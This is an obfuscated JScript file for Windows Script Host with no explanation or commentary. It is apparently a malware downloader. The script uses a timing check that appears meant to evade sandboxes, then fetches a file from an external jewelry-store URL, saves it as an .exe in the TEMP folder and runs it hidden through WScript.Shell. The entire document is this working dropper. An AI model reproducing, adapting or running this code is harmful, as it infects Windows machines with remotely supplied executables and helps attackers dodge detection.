var HO = false;
var TA = "Create"+"Object";
var E = function P() {return WScript[TA]("WScript"+".Shell");}(), R0 = 11;
var U0 = "MSXML2"+".XMLHTTP";
var JA = 2;
var UA = JA - 2;
function C(L){E["Run"](L, UA, UA);};
function CO(){return U0 + "";};
function TN(L0, VC){UA = UA * 1; return L0 - VC;};
function PI(){return TA;};
/*@cc_on
  @if (@_win32 || @_win64)
    HO = true;
  @end
@*/
if (HO)
{
var QN = "";
function Q(){return 22;};
var C1 = 0; var H = 0;
function DC()
{
var RU = new this["Date"]();
var A = RU["getUTCMilliseconds"]();
WScript["Sleep"](Q());
var RU = new this["Date"]();
var R = RU["getUTCMilliseconds"]();
WScript["Sleep"](Q());
var RU = new this["Date"]();
var WC = RU["getUTCMilliseconds"]();
var C1 = "C0";
C1 = TN(R, A);
var H = "G";
H = TN(WC, R);
QN = "open";
return TN(C1, H);
}
var DS = false;
var SM = false;
for (var HN = UA; HN < Q() * 1; HN++){if (DC() != UA){
DS = true; 
H = "31" + 11 * C1 + H; 
SM = true; 
break;
}}
function N() {return ((DS == true) && (DS == SM)) ? 1 : UA;};
if (DS && N() && SM){
function KC() {return E["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "C3O5PFXpYyx.ex" + "e";};
 JF = CO();
 JB = WScript[TA](JF);
 var B = 1;
do { 
	for (;B;){
	try {
		if (B == 1)
		{
			JB[QN]("GET", "http://aaacollectionsjewelry.com/x9djsa", false);
			JB["send"]();
			ZK = "Sleep";
			B = 2;
		}
		WScript[ZK](Q() + 120); 
		if (JB["readystate"] < 2 * 2) continue;
		B = UA;
		function Y(U) {var J = (1, 2, 3, 4, 5, U); return J;};
		V = WScript[PI()]("ADODB.Stream");
		JF = V;
		JF[QN]();
		JF["type"] = Y(1);
		JF["write"](JB["ResponseBody"]);
		V["position"] = Y(UA);
		JF["Save" + "ToFile"](KC(), 2);
		V["cl"+"ose"]();
		GJ = KC();
		C(GJ);
	} catch(Q0){};};
}while (B);
}
}

